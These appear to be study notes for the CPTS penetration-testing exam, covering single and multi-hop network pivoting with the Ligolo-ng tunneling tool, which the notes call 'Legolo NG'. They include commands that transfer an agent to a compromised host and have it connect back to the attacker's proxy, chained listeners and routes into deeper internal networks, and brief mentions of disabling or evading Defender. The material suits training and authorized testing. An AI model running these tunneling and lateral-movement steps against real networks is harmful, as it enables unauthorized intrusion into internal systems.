# 🕸️ 1. Legolo NG — Pivoting & Multi-Pivoting

> [!info]  
> **Legolo NG** is a lightweight tunneling/pivoting tool designed for penetration testers. It can establish tunnels over a reverse TCP/TLS connection using a **TUN interface**, allowing the attack machine to route traffic through a compromised Windows or Linux host and reach networks that are otherwise inaccessible.
> 
> For CPTS, the important idea is not simply memorizing Legolo commands. The goal is understanding **why the tunnel exists, where traffic travels, how routes are added, and how additional compromised hosts can become additional pivot points**.

---

# 🎯 2. What Is Pivoting?

**Pivoting** is a post-exploitation technique where a compromised host is used as a **stepping stone** to reach other hosts or networks that the original attacking machine cannot directly access.

A typical penetration test starts like this:

```text
                    ATTACKER
                       │
                       │ Directly reachable
                       ▼
                ┌──────────────┐
                │ Compromised  │
                │ Host         │
                └──────┬───────┘
                       │
                       │ Has access to
                       ▼
              ┌──────────────────┐
              │ Internal Network │
              │ inaccessible     │
              │ to attacker      │
              └──────────────────┘
```

The compromised host becomes the **pivot**.

Instead of attacking the internal network directly:

```text
Kali ───────────────X──────────────► Internal Host
```

we make Kali send traffic through the compromised system:

```text
Kali
  │
  │ Tunnel
  ▼
Compromised Host
  │
  │ Internal network access
  ▼
Internal Host
```

---

# 🧠 3. Why Pivoting Matters in a CPTS Assessment

The first system you compromise is often **not the most valuable system**.

For example:

```text
Internet / External Network
          │
          ▼
     Web Server
          │
          │ Pivot
          ▼
   Internal Network
          │
      ┌───┴────┐
      ▼        ▼
   Database   File Server
      │
      ▼
Domain Controller
```

The initial foothold could be:

- A workstation
    
- A web server
    
- A DMZ server
    
- An externally exposed application
    
- A jump host
    

But the valuable targets may exist deeper inside the network:

- Domain Controllers
    
- Database servers
    
- File servers
    
- Internal applications
    
- Management systems
    
- Other workstations
    
- Credential stores
    

> [!important]  
> **Pivoting turns a single foothold into access to an entire reachable portion of the network.**
> 
> In CPTS, think beyond:
> 
> `Compromise → Shell`
> 
> and instead think:
> 
> `Compromise → Enumerate Interfaces → Discover Hidden Network → Pivot → Enumerate New Network → Compromise New Host → Pivot Again`

---

# 🔀 4. Single Pivot vs Multi-Pivot

## 🔹 4.1 Single Pivot

Suppose Kali and the first compromised machine share:

```text
10.10.10.0/24
```

but the compromised host also has access to:

```text
10.10.11.0/24
```

while Kali does not.

```text
                 10.10.10.0/24
                       │
              ┌────────┴────────┐
              │                 │
            Kali            Foothold
                              │
                              │
                       10.10.11.0/24
                              │
                     ┌────────┴────────┐
                     │                 │
                  Host A            Host B
```

The foothold becomes the pivot.

Without pivoting:

```text
Kali ─────────────X────────────► 10.10.11.0/24
```

With pivoting:

```text
Kali
 │
 │ Legolo tunnel
 ▼
Foothold
 │
 ▼
10.10.11.0/24
```

---

# 🔁 5. Multi-Pivoting

A single pivot may not be enough.

Imagine:

```text
Kali
 │
 ▼
Pivot 1
 │
 │ 172.16.5.0/24
 ▼
Pivot 2
 │
 │ 172.16.6.0/24
 ▼
Pivot 3
 │
 │ 172.16.10.0/24
 ▼
Deep Internal Network
```

The attacker's machine may only directly reach Pivot 1.

Pivot 1 can reach Pivot 2.

Pivot 2 can reach Pivot 3.

Pivot 3 can reach another internal network.

Therefore:

```text
ATTACKER
   │
   ▼
[Pivot 1]
   │
   ▼
[Pivot 2]
   │
   ▼
[Pivot 3]
   │
   ▼
[Internal Network]
```

This is **multi-pivoting**.

> [!important]  
> Multi-pivoting is simply repeating the pivoting concept.
> 
> Each newly compromised host can become a **jump box** to another network.

---

# 🧠 6. The Most Important Mental Model

The most important concept is:

> **A pivot does not magically give Kali access to everything.**
> 
> You are creating a path through a compromised machine and then telling Kali **which traffic should use that path**.

Think of it as a road system:

```text
Kali
 │
 │ Route
 ▼
TUN Interface
 │
 │ Legolo Tunnel
 ▼
Pivot 1
 │
 │ Pivot 1's network interface
 ▼
Internal Network
```

For multiple pivots:

```text
Kali
 │
 ▼
TUN Interface #1
 │
 ▼
Pivot 1
 │
 ▼
Listener / Forward
 │
 ▼
TUN Interface #2
 │
 ▼
Pivot 2
 │
 ▼
Internal Network #2
```

For a third pivot:

```text
Kali
 │
 ▼
Legolo
 │
 ▼
Pivot 1
 │
 ▼
Listener
 │
 ▼
Pivot 2
 │
 ▼
Listener
 │
 ▼
Pivot 3
 │
 ▼
Deep Internal Network
```

---

# 🛠️ 7. Legolo NG Architecture

Legolo uses two major components:

```text
┌───────────────────────────────┐
│ Kali / Attack Machine         │
│                               │
│ Legolo Proxy                  │
│       │                       │
│       │ TLS / TCP tunnel      │
│       ▼                       │
│ TUN Interface                 │
└───────┬───────────────────────┘
        │
        │ Network Tunnel
        ▼
┌───────────────────────────────┐
│ Compromised Host              │
│                               │
│ Legolo Agent                  │
│       │                       │
│       ▼                       │
│ Internal Network              │
└───────────────────────────────┘
```

### Proxy

The **Legolo proxy** runs on the attack machine.

It manages the connections from agents and establishes the tunnel.

### Agent

The **Legolo agent** runs on the compromised host.

It connects back to the Legolo proxy.

The agent therefore turns the compromised machine into a pivot point.

---

# 📦 8. Installing Legolo NG

There are several ways to obtain Legolo.

## 🔹 Method 1 — Package Manager

The source demonstrates:

```bash
sudo apt install ligolo-ng
```

This allows the Legolo agent/proxy to be available from the terminal.

> [!warning]  
> Package names and availability can differ depending on the Kali/Debian repository state. Verify the package available in your environment rather than assuming every version uses exactly the same package name.

---

## 🔹 Method 2 — Compile From Source

The source notes that the binary can be compiled from the Legolo NG GitHub repository.

For a real engagement, reviewing source code and compiling your own binaries can be preferable to blindly executing third-party precompiled binaries.

---

## 🔹 Method 3 — Precompiled Releases

The demonstration uses precompiled release binaries.

For the Kali Linux example, the source uses a Linux AMD64 proxy release.

The general workflow is:

```text
GitHub Releases
      │
      ▼
Download Proxy
      │
      ▼
Decompress
      │
      ▼
Extract TAR
      │
      ▼
Run Proxy
```

The source demonstrates decompression with:

```bash
gzip <filename>.gz -d
```

followed by:

```bash
tar -xf <filename>.tar
```

After extraction, the Legolo proxy executable is available.

> [!warning]  
> The exact filename depends on the release version and architecture. Do not blindly copy an old release filename when using a newer version.

---

# 🔐 9. Starting the Legolo Proxy

The demonstration starts the proxy with:

```bash
sudo ./proxy -selfcert
```

The `-selfcert` option causes Legolo to create a self-signed certificate for the web interface.

The proxy asks whether the web UI should be enabled.

If enabled:

```text
Web UI
   │
   ▼
127.0.0.1:8080
```

The important tunnel listener is:

```text
11601
```

So conceptually:

```text
Kali
 │
 ├── Web UI ─────► 127.0.0.1:8080
 │
 └── Agent Listener ─────► :11601
```

> [!important]  
> **Port 11601 is the Legolo agent connection point in the demonstrations.**
> 
> The agents connect back to the proxy through this listener.

---

# 🖥️ 10. Example Network Before Pivoting

The first demonstration uses a Windows 10 machine with two network connections.

The Kali machine has access to:

```text
192.168.1.0/24
```

The Windows foothold is also connected to that network.

But the Windows host additionally has access to:

```text
169.254.62.0/24
```

Kali cannot directly reach this second network.

Conceptually:

```text
                    Kali
               192.168.1.107
                    │
                    │
             192.168.1.0/24
                    │
                    ▼
              Windows 10
             192.168.1.105
                    │
                    │
                    ▼
             169.254.62.0/24
                    │
                    ▼
          169.254.62.20
```

From Kali:

```bash
ping 169.254.62.20
```

produces an unreachable result.

The important observation is:

```text
Kali ───────X──────► 169.254.62.20
```

but:

```text
Windows 10 ───────► 169.254.62.20
```

works because Windows has an interface connected to that network.

That difference is exactly what makes Windows useful as a pivot.

---

# 🧠 11. Identifying a Pivot Candidate

When you obtain a shell on a compromised machine, one of the first things to inspect is its network configuration.

On Linux:

```bash
ifconfig
```

or preferably:

```bash
ip addr
```

On Windows:

```cmd
ipconfig
```

You are looking for:

```text
Interface 1 → Network A
Interface 2 → Network B
```

The second network is potentially inaccessible from your attack machine.

> [!tip]  
> **Multiple network interfaces = immediate pivoting question.**
> 
> Ask:
> 
> 1. What networks can my attack machine reach?
>     
> 2. What networks can the compromised host reach?
>     
> 3. Which networks does the compromised host see that I cannot?
>     
> 4. Can I route traffic through the compromised host?
>     

---

# 📥 12. Transfer the Legolo Agent

After compromising the Windows host, the agent must be transferred to it.

The source demonstrates using a simple Python HTTP server.

From the directory containing the agent:

```bash
python3 -m http.server 80
```

The Windows host can then access:

```text
http://<Kali-IP>/
```

and download:

```text
agent.exe
```

The same basic idea can be performed from a command-line-only shell using tools such as:

```bash
curl
```

or:

```bash
wget
```

depending on what is available on the target.

---

# ⚠️ 13. Defender / Endpoint Protection Consideration

The source demonstrates disabling Microsoft Defender so the example executable can run.

In a real engagement, security controls may detect known tunneling/pivoting binaries.

The source mentions two broad approaches:

```text
Known executable
      │
      ├──► Detection / blocking
      │
      ├──► Obfuscation
      │
      └──► Memory-based execution
```

> [!warning]  
> The important CPTS concept is **not** to assume that a transferred executable will always execute successfully.
> 
> Real environments may have:
> 
> - Microsoft Defender
>     
> - EDR
>     
> - Application controls
>     
> - Network detection
>     
> - Antivirus signatures
>     
> - Behavioral detection
>     
> 
> In a CPTS lab/exam environment, the exercise may simplify these constraints.

---

# 🔌 14. Connecting the Windows Agent to the Proxy

Once `agent.exe` is on the Windows machine, it connects back to the Kali proxy.

The source demonstrates:

```cmd
.\agent.exe -connect 192.168.1.107:11601 -ignore-cert
```

### Important components

|Component|Meaning|
|---|---|
|`.\agent.exe`|Execute the Legolo agent|
|`-connect`|Specify the Legolo proxy address|
|`192.168.1.107:11601`|Kali IP and Legolo listener port|
|`-ignore-cert`|Ignore certificate verification when using the self-signed certificate|

The flow is:

```text
Windows Agent
      │
      │ TCP/TLS
      │
      ▼
192.168.1.107:11601
      │
      ▼
Legolo Proxy
      │
      ▼
Kali
```

A successful connection produces a message indicating that the connection has been established.

The proxy then reports that a new agent has joined.

---

# 🎛️ 15. Interacting With the Legolo Agent

Once an agent connects, the proxy can display available sessions.

The source uses:

```text
session
```

If only one agent exists, selecting session `1` enters that agent.

Conceptually:

```text
Legolo Proxy
     │
     ├── Session 1 → Windows 10
     │
     └── Session 2 → Another Pivot
```

The `help` command displays available actions.

The important capabilities include:

- Creating network interfaces
    
- Starting/stopping tunnels
    
- Adding listeners
    
- Configuring routes
    
- Automatically configuring routes
    

---

# 🚦 16. Auto Route — Simple Single Pivot

The first video demonstrates:

```text
auto_route
```

The exact prompt/interface depends on the Legolo version.

The purpose is to automatically configure access to networks reachable through the selected agent.

The source selects the internal network:

```text
169.254.62.0/24
```

rather than the already-accessible:

```text
192.168.1.0/24
```

---

# 🧠 17. Why Auto Route Works

Before the tunnel:

```text
Kali
 │
 │ No route
 X
 │
 ▼
169.254.62.0/24
```

After configuring the tunnel:

```text
Kali
 │
 ▼
Legolo TUN Interface
 │
 ▼
Windows Agent
 │
 ▼
169.254.62.0/24
```

The critical change is that Kali now has a **network interface and route** that cause traffic destined for the internal network to enter the Legolo tunnel.

This means Kali tools can operate normally.

For example:

```bash
ping 169.254.62.20
```

can now work.

---

# 🌐 18. Why a TUN Interface Is So Useful

A major advantage of Legolo is that it can provide a virtual network interface.

Conceptually:

```text
Normal Kali Interfaces

eth0
eth1
lo
```

After creating the tunnel:

```text
eth0
eth1
lo
legolo
```

The new interface behaves as the entry point for traffic that needs to cross the tunnel.

Therefore, instead of:

```bash
proxychains nmap ...
proxychains curl ...
proxychains ...
```

for every tool, you can route traffic through the TUN interface.

> [!important]  
> This is one of the biggest conceptual advantages of a TUN-based pivot.
> 
> **You are extending your attack machine's routing table instead of merely proxying individual applications.**

---

# 🛣️ 19. Routing Mental Model

A route determines:

```text
DESTINATION
     ↓
WHERE should traffic go?
     ↓
INTERFACE
     ↓
WHICH interface should carry it?
```

For example:

```text
169.254.62.0/24
        │
        ▼
   Legolo TUN
        │
        ▼
Windows Pivot
```

So when Kali runs:

```bash
ping 169.254.62.20
```

the routing table determines that:

```text
169.254.62.20
        ↓
169.254.62.0/24
        ↓
Legolo Interface
        ↓
Tunnel
        ↓
Windows
        ↓
169.254.62.20
```

---

# 🔎 20. Verify the Tunnel

The source uses:

```bash
ifconfig
```

to confirm that the new Legolo interface exists.

You can also inspect routes using:

```bash
ip route
```

The expected concept is:

```text
169.254.62.0/24 dev <Legolo-interface>
```

The exact interface name depends on the configuration/version.

---

# 🧪 21. Test the Pivot

Before pivoting:

```bash
ping 169.254.62.20
```

fails.

After pivoting:

```bash
ping 169.254.62.20
```

returns replies.

This proves:

```text
Kali
  │
  ▼
Legolo
  │
  ▼
Windows Pivot
  │
  ▼
169.254.62.20
```

---

# 🛰️ 22. Enumerate the Newly Accessible Network

Once the pivot works, do not stop at:

```text
Ping works!
```

The next step in a CPTS assessment is **enumeration**.

If you discover:

```text
169.254.62.0/24
```

you should investigate what hosts and services exist there.

For example:

```bash
nmap -sC -sV 169.254.62.0/24
```

The exact scan should be adapted to the situation.

The methodology is:

```text
Pivot established
      ↓
New network reachable
      ↓
Enumerate hosts
      ↓
Enumerate ports
      ↓
Identify services
      ↓
Attack services
      ↓
Obtain credentials / shell
      ↓
Look for another network
      ↓
Pivot again
```

> [!important]  
> **Pivoting is not the end goal.**
> 
> Pivoting exists to enable enumeration and exploitation of otherwise inaccessible systems.

---

# 🖥️ 23. Validate With RDP

The first demonstration proves that the tunnel provides real network access by connecting to the previously inaccessible Windows system using RDP.

Conceptually:

```text
Kali
 │
 │ RDP traffic
 ▼
Legolo TUN
 │
 ▼
Windows Pivot
 │
 ▼
169.254.62.20
 │
 ▼
RDP Service
```

This demonstrates that the tunnel is not limited to ICMP.

The attacker can use normal network tools against the newly reachable network.

---

# 🧠 24. Single-Pivot Workflow — CPTS Mental Model

```text
🔎 COMPROMISE
      ↓
🖥️ ENUMERATE NETWORK INTERFACES
      ↓
🌐 FIND NETWORKS THE PIVOT CAN REACH
      ↓
❌ IDENTIFY NETWORKS KALI CANNOT REACH
      ↓
📥 TRANSFER LEGolo AGENT
      ↓
🔌 AGENT CONNECTS TO PROXY
      ↓
🎛️ SELECT AGENT SESSION
      ↓
🛣️ CREATE / CONFIGURE TUN INTERFACE
      ↓
🗺️ ADD ROUTE TO INTERNAL NETWORK
      ↓
📡 TEST CONNECTIVITY
      ↓
🔎 ENUMERATE INTERNAL NETWORK
      ↓
🎯 ATTACK INTERNAL SERVICES
```

---

# 🔁 25. Multi-Pivoting — Why One Tunnel Is Not Always Enough

Consider:

```text
ATTACK BOX
10.129.x.x
    │
    ▼
PIVOT 1
10.129.229.129
    │
    │ 172.16.5.0/24
    ▼
PIVOT 2
172.16.5.35
    │
    │ 172.16.6.0/24
    ▼
PIVOT 3
172.16.6.25
    │
    │ 172.16.10.0/24
    ▼
DEEP INTERNAL NETWORK
```

The attack machine cannot directly reach:

```text
172.16.5.0/24
172.16.6.0/24
172.16.10.0/24
```

But:

```text
Pivot 1 → 172.16.5.0/24
Pivot 2 → 172.16.6.0/24
Pivot 3 → 172.16.10.0/24
```

Therefore each compromised host becomes another jump box.

---

# 🧱 26. Multi-Pivot Lab Topology

The second demonstration starts with an attack box containing:

```text
tun0
10.10.15.1
```

The first foothold has:

```text
10.129.229.129
172.16.5.15
```

The important point is:

```text
Attack Box
10.10.15.1
      │
      │ Can reach
      ▼
10.129.229.129
      │
      │ Can reach
      ▼
172.16.5.0/24
```

But the attack box cannot initially reach:

```text
172.16.5.0/24
```

---

# 🛠️ 27. Create the First TUN Interface

The source creates a dedicated interface:

```bash
sudo ip tuntap add user kali mode tun legolo
```

Then enables it:

```bash
sudo ip link set legolo up
```

Verify:

```bash
ifconfig
```

The important idea is that the interface exists, but no tunnel traffic is flowing yet.

```text
legolo
   │
   └── Interface exists
       but no useful route/tunnel yet
```

---

# 🚀 28. Start the Legolo Proxy

Start the proxy:

```bash
sudo ./proxy -selfcert
```

The demonstration disables the web UI.

The proxy listens on:

```text
11601
```

This is the connection point for the first agent.

---

# 📤 29. Transfer the Linux Agent to Pivot 1

The source uses HTTP transfer with Python.

The general approach:

```text
Attack Box
   │
   │ HTTP
   ▼
Pivot 1
```

After transferring the Linux agent, make it executable:

```bash
chmod +x <agent>
```

Then connect it to the proxy:

```bash
./<linux-agent> -connect <ATTACKER-IP>:11601 -ignore-cert
```

The source describes the connection as:

```text
Linux Pivot
     │
     │ connect
     ▼
Attack Box:11601
```

A successful connection produces:

```text
Connection established
```

and the proxy reports that an agent has joined.

---

# 🎛️ 30. Enter Pivot 1 Session

Inside the Legolo proxy:

```text
session
```

Select the first agent.

You are now interacting with the first compromised Linux system through the Legolo proxy.

---

# 🛣️ 31. Start the First Tunnel

The source uses:

```text
start --tun legolo
```

The purpose is to associate the selected Legolo agent with the TUN interface created earlier.

Now add the internal network route:

```bash
sudo ip route add 172.16.5.0/24 dev legolo
```

The traffic flow becomes:

```text
Kali
 │
 │ destination: 172.16.5.x
 ▼
172.16.5.0/24 route
 │
 ▼
legolo
 │
 ▼
Legolo Tunnel
 │
 ▼
Pivot 1
 │
 ▼
172.16.5.0/24
```

---

# 🔎 32. Verify First Pivot

Test:

```bash
ping 172.16.5.15
```

If successful:

```text
Kali
  │
  ▼
legolo
  │
  ▼
Pivot 1
  │
  ▼
172.16.5.15
```

You can inspect routes with:

```bash
ip route
```

You should see a route for:

```text
172.16.5.0/24
```

using:

```text
legolo
```

---

# 🎯 33. Discovering Pivot 2

After enumerating:

```text
172.16.5.0/24
```

suppose another host is compromised:

```text
172.16.5.35
```

This host has another network interface:

```text
172.16.6.35
```

Therefore:

```text
Pivot 1
172.16.5.15
      │
      │
      ▼
Pivot 2
172.16.5.35
      │
      │
      ▼
172.16.6.35
```

The attack box and Pivot 1 cannot directly access:

```text
172.16.6.0/24
```

Therefore Pivot 2 becomes the next stepping stone.

---

# 🧠 34. The Key Multi-Pivot Problem

The first pivot is connected to our attack machine.

But the second pivot is **not** directly reachable by the attack machine.

Therefore the second Legolo agent cannot simply connect directly to the attack machine's original listener.

We need another forwarding mechanism.

This is where **listeners** become important.

---

# 🔌 35. Create the Second TUN Interface

Create:

```bash
sudo ip tuntap add user kali mode tun legolo-double
```

Enable it:

```bash
sudo ip link set legolo-double up
```

Now the attack machine has:

```text
legolo
legolo-double
```

Mental model:

```text
legolo
   │
   └── Network reachable through Pivot 1

legolo-double
   │
   └── Network reachable through Pivot 2
```

---

# 📡 36. Why a Listener Is Required for Multi-Pivoting

Pivot 2 is behind Pivot 1.

Therefore:

```text
Pivot 2 ───X───► Attack Box
```

Instead:

```text
Pivot 2
   │
   ▼
Pivot 1
   │
   ▼
Attack Box
```

We therefore create a listener on Pivot 1.

The source uses:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

The purpose is:

```text
Pivot 1 :11601
      │
      ▼
Pivot 1 localhost:11601
      │
      ▼
Attack Box
```

The listener allows traffic arriving at Pivot 1 on port `11601` to be forwarded back through the existing tunnel toward the attack machine.

> [!important]  
> This is the fundamental multi-pivot concept:
> 
> **The next agent connects to the previous pivot, and the previous pivot forwards that connection back through the already-established tunnel.**

---

# 🔄 37. Multi-Pivot Connection Flow

The second agent connection looks like:

```text
                    ┌───────────────────────┐
                    │      Attack Box       │
                    │                       │
                    │   Legolo Proxy        │
                    │        ▲              │
                    │        │              │
                    │        │ Tunnel        │
                    └────────┼───────────────┘
                             │
                             │
                     ┌───────┴───────┐
                     │    Pivot 1    │
                     │               │
                     │ Listener      │
                     │ :11601        │
                     └───────┬───────┘
                             │
                             │ :11601
                             ▼
                     ┌───────────────┐
                     │    Pivot 2    │
                     │ Legolo Agent  │
                     └───────────────┘
```

So Pivot 2 effectively connects:

```text
Pivot 2
   ↓
Pivot 1 listener
   ↓
Existing Pivot 1 tunnel
   ↓
Attack Box
   ↓
Legolo Proxy
```

---

# 🔎 38. Verify the Listener

The source uses:

```text
listener_list
```

The listener should report an online status.

Conceptually:

```text
Listener
   │
   ├── Address: 0.0.0.0:11601
   ├── Forward: localhost:11601
   └── Status: online
```

---

# 📥 39. Transfer the Windows Agent to Pivot 2

The second pivot is a Windows host.

Transfer the Windows agent to it using any available method.

The source example uses SMB.

Once the agent is on the Windows system, it can be executed from a shell.

---

# 🔌 40. Connect Pivot 2 Agent Through Pivot 1

Pivot 2 has:

```text
172.16.5.35
```

and Pivot 1's internal interface is:

```text
172.16.5.15
```

Because Pivot 1 is listening on:

```text
11601
```

Pivot 2 connects to:

```cmd
.\agent.exe -connect 172.16.5.15:11601 -ignore-cert
```

The connection path becomes:

```text
Pivot 2 Agent
      │
      │ 172.16.5.15:11601
      ▼
Pivot 1 Listener
      │
      ▼
Existing Legolo Tunnel
      │
      ▼
Attack Box
      │
      ▼
Legolo Proxy
```

---

# 🎛️ 41. Select the Second Session

Back in the proxy:

```text
session
```

There should now be two agents:

```text
1. Pivot 1
2. Pivot 2
```

Select the second session.

You are now interacting with Pivot 2 through the chained tunnel.

---

# 🛣️ 42. Route Pivot 2's Network

Pivot 2 has access to:

```text
172.16.6.0/24
```

Create the route through the second TUN interface:

```bash
sudo ip route add 172.16.6.0/24 dev legolo-double
```

Now:

```text
172.16.6.0/24
        │
        ▼
legolo-double
        │
        ▼
Pivot 2
```

---

# 🚀 43. Start the Second Tunnel

Inside the Legolo proxy, while the Pivot 2 session is selected:

```text
start --tun legolo-double
```

The traffic path is now:

```text
Kali
 │
 ▼
legolo-double
 │
 ▼
Legolo Proxy
 │
 ▼
Pivot 1
 │
 ▼
Pivot 2
 │
 ▼
172.16.6.0/24
```

---

# 🧪 44. Verify the Double Pivot

Test:

```bash
ping 172.16.6.35
```

If successful:

```text
Attack Box
   │
   ▼
legolo-double
   │
   ▼
Pivot 1
   │
   ▼
Pivot 2
   │
   ▼
172.16.6.35
```

This proves that the second internal network is reachable.

---

# 🧠 45. Double Pivot Mental Model

The entire chain is:

```text
                 ┌────────────────┐
                 │   Attack Box   │
                 └───────┬────────┘
                         │
                         │ Legolo Tunnel #1
                         ▼
                 ┌────────────────┐
                 │    Pivot 1     │
                 │  172.16.5.15  │
                 └───────┬────────┘
                         │
                         │ Listener :11601
                         ▼
                 ┌────────────────┐
                 │    Pivot 2     │
                 │  172.16.5.35  │
                 └───────┬────────┘
                         │
                         │
                         ▼
                 172.16.6.0/24
```

The important distinction is:

```text
Pivot 1 = gateway to Network 1

Pivot 2 = gateway to Network 2
```

---

# 🔁 46. Triple Pivot

The exact same concept can be repeated.

Suppose a host on:

```text
172.16.6.0/24
```

is compromised:

```text
172.16.6.25
```

and it has access to:

```text
172.16.10.0/24
```

The topology becomes:

```text
Attack Box
    │
    ▼
Pivot 1
    │
    ▼
Pivot 2
    │
    ▼
Pivot 3
    │
    ▼
172.16.10.0/24
```

---

# 🛠️ 47. Create the Third TUN Interface

Create:

```bash
sudo ip tuntap add user kali mode tun legolo-triple
```

Enable it:

```bash
sudo ip link set legolo-triple up
```

Verify:

```bash
ifconfig
```

You should now have a third virtual interface.

---

# 📡 48. Create a Listener on Pivot 2

Because Pivot 3 is behind Pivot 2, Pivot 2 must forward the next agent connection.

Inside the Pivot 2 session:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Then verify:

```text
listener_list
```

At this point there are listeners on both:

```text
Pivot 1
Pivot 2
```

---

# 🔌 49. Connect Pivot 3 Through Pivot 2

Pivot 3 has:

```text
172.16.6.25
```

The listener on Pivot 2 is reachable through:

```text
172.16.6.35:11601
```

Therefore the Windows agent on Pivot 3 connects using:

```cmd
.\agent.exe -connect 172.16.6.35:11601 -ignore-cert
```

Connection path:

```text
Pivot 3 Agent
      │
      ▼
Pivot 2 :11601
      │
      ▼
Pivot 2 Listener
      │
      ▼
Existing Pivot 2 Tunnel
      │
      ▼
Pivot 1
      │
      ▼
Attack Box
      │
      ▼
Legolo Proxy
```

---

# 🎛️ 50. Select Pivot 3

Inside the proxy:

```text
session
```

Select the third agent.

Now the proxy has:

```text
Session 1 → Pivot 1
Session 2 → Pivot 2
Session 3 → Pivot 3
```

---

# 🛣️ 51. Route the Third Internal Network

Pivot 3 provides access to:

```text
172.16.10.0/24
```

Therefore add:

```bash
sudo ip route add 172.16.10.0/24 dev legolo-triple
```

Then, in the Pivot 3 session, start the tunnel:

```text
start --tun legolo-triple
```

The complete path is:

```text
Kali
 │
 ▼
legolo-triple
 │
 ▼
Legolo Proxy
 │
 ▼
Pivot 1
 │
 ▼
Pivot 2
 │
 ▼
Pivot 3
 │
 ▼
172.16.10.0/24
```

---

# 🧪 52. Verify the Triple Pivot

Test connectivity to hosts on:

```text
172.16.10.0/24
```

For example:

```bash
ping <172.16.10.x>
```

Successful responses prove that the third pivot is working.

---

# 🧠 53. The General Multi-Pivot Algorithm

The procedure is repetitive.

For every newly discovered pivot:

```text
1️⃣ Discover a host
      ↓
2️⃣ Obtain access
      ↓
3️⃣ Enumerate interfaces
      ↓
4️⃣ Identify a new inaccessible network
      ↓
5️⃣ Create a new TUN interface
      ↓
6️⃣ Create listener on the previous pivot
      ↓
7️⃣ Transfer Legolo agent to new pivot
      ↓
8️⃣ Agent connects to previous pivot
      ↓
9️⃣ Select new Legolo session
      ↓
🔟 Add route for new network
      ↓
1️⃣1️⃣ Start tunnel using new TUN interface
      ↓
1️⃣2️⃣ Test connectivity
      ↓
1️⃣3️⃣ Enumerate new network
      ↓
1️⃣4️⃣ Repeat if another pivot exists
```

---

# 🧠 54. The Critical Difference Between Single and Multi-Pivoting

|Single Pivot|Multi-Pivot|
|---|---|
|Attack box connects directly to pivot|New pivot is behind an existing pivot|
|One agent may be enough|Multiple agents are required|
|One tunnel|Multiple chained tunnels|
|One TUN interface can be enough|Separate TUN interfaces make each network easier to manage|
|Direct agent → proxy connection|New agent → previous pivot listener → existing tunnel → proxy|
|Route traffic to one internal network|Route different networks through different tunnel interfaces|

---

# 🧩 55. Why the Listener Is the Key to Multi-Pivoting

This is probably the most important part of the second video.

Suppose:

```text
Kali
 │
 ▼
Pivot 1
 │
 ▼
Pivot 2
```

Pivot 2 cannot directly reach Kali.

Therefore:

```text
Pivot 2 ───────X──────► Kali
```

Instead:

```text
Pivot 2
   │
   ▼
Pivot 1 Listener
   │
   ▼
Existing Pivot 1 Tunnel
   │
   ▼
Kali
```

The listener effectively makes Pivot 1 act as a **bridge for the second agent's connection**.

This is why every additional pivot adds another forwarding layer.

---

# 🧠 56. Multi-Pivot Mental Model

Remember this:

```text
                 ┌─────────────┐
                 │ Attack Box  │
                 └──────┬──────┘
                        │
                  Tunnel #1
                        │
                        ▼
                 ┌─────────────┐
                 │   Pivot 1   │
                 └──────┬──────┘
                        │
                   Listener
                        │
                  Tunnel #2
                        │
                        ▼
                 ┌─────────────┐
                 │   Pivot 2   │
                 └──────┬──────┘
                        │
                   Listener
                        │
                  Tunnel #3
                        │
                        ▼
                 ┌─────────────┐
                 │   Pivot 3   │
                 └──────┬──────┘
                        │
                        ▼
                Deep Network
```

Every new pivot:

```text
NEW NETWORK
     ↓
NEW COMPROMISED HOST
     ↓
NEW AGENT
     ↓
NEW LISTENER ON PREVIOUS PIVOT
     ↓
NEW TUN INTERFACE
     ↓
NEW ROUTE
     ↓
NEW TUNNEL
```

---

# 🗺️ 57. Full CPTS Pivoting Decision Flow

```text
┌─────────────────────────────┐
│      Initial Foothold       │
└──────────────┬──────────────┘
               │
               ▼
      Enumerate Interfaces
               │
               ▼
     ┌─────────────────────┐
     │ Multiple Networks?  │
     └─────────┬───────────┘
               │
          YES  │
               ▼
     Identify inaccessible
          network
               │
               ▼
       Establish tunnel
               │
               ▼
        Add route / TUN
               │
               ▼
      Test connectivity
               │
               ▼
      Enumerate network
               │
               ▼
       Find new host(s)
               │
               ▼
       Gain new foothold
               │
               ▼
     Enumerate its network
               │
               ▼
     ┌─────────────────────┐
     │ Another hidden      │
     │ network available?  │
     └─────────┬───────────┘
               │
          YES  │
               ▼
        Create listener
               │
               ▼
      New agent connects
        through pivot
               │
               ▼
        New TUN interface
               │
               ▼
          Add route
               │
               ▼
        Start tunnel
               │
               └──────────────► REPEAT
```

---

# 🔎 58. What to Look For After Every Compromise

Whenever you obtain a shell, immediately think:

### 🌐 Network Enumeration

```text
What interfaces exist?
What IP addresses exist?
What subnets are connected?
What routes exist?
What hosts can this machine reach?
```

Linux:

```bash
ip addr
ip route
```

or:

```bash
ifconfig
```

Windows:

```cmd
ipconfig
route print
```

### 🔐 Credential Enumeration

Ask:

```text
Did I obtain credentials?
Can they authenticate to another host?
Can they provide access to RDP/SMB/WinRM/SSH/etc.?
```

### 🎯 Service Enumeration

Once a new network is reachable:

```text
Host discovery
      ↓
Port scan
      ↓
Service identification
      ↓
Version enumeration
      ↓
Credential testing
      ↓
Exploit / authenticate
      ↓
New foothold
```

---

# 🧠 59. Pivoting Is a Feedback Loop

Pivoting should not be viewed as:

```text
Compromise → Pivot → Done
```

Instead:

```text
       ┌──────────────────────┐
       │   Compromise Host    │
       └──────────┬───────────┘
                  ↓
        Enumerate Interfaces
                  ↓
          Discover Network
                  ↓
             Pivot
                  ↓
       Enumerate New Network
                  ↓
        Discover New Host
                  ↓
         Compromise Host
                  │
                  └──────────────┐
                                 ▼
                         Enumerate Again
```

> [!important]  
> **Every new foothold can reveal a new topology.**
> 
> That topology can reveal another network.
> 
> That network can reveal another host.
> 
> That host can become another pivot.

This is why penetration testing is an iterative process rather than a linear list of commands.

---

# 🧭 60. CPTS Methodology — What the Author Is Actually Thinking

The commands may initially look arbitrary:

```text
ip tuntap
ip route
listener_add
agent -connect
start --tun
```

But the reasoning behind them is systematic.

### Step 1 — Find a network I cannot reach

```text
Kali
  │
  X
  │
Internal Network
```

### Step 2 — Find a host that can reach it

```text
Kali
  │
  ▼
Compromised Host
  │
  ▼
Internal Network
```

### Step 3 — Put a tunnel through that host

```text
Kali
  │
  ▼
Legolo
  │
  ▼
Compromised Host
  │
  ▼
Internal Network
```

### Step 4 — Make Kali route that network through the tunnel

```text
172.16.5.0/24
        ↓
    legolo
```

### Step 5 — Enumerate

```text
Nmap
   ↓
Hosts
   ↓
Services
   ↓
Credentials / Exploitation
```

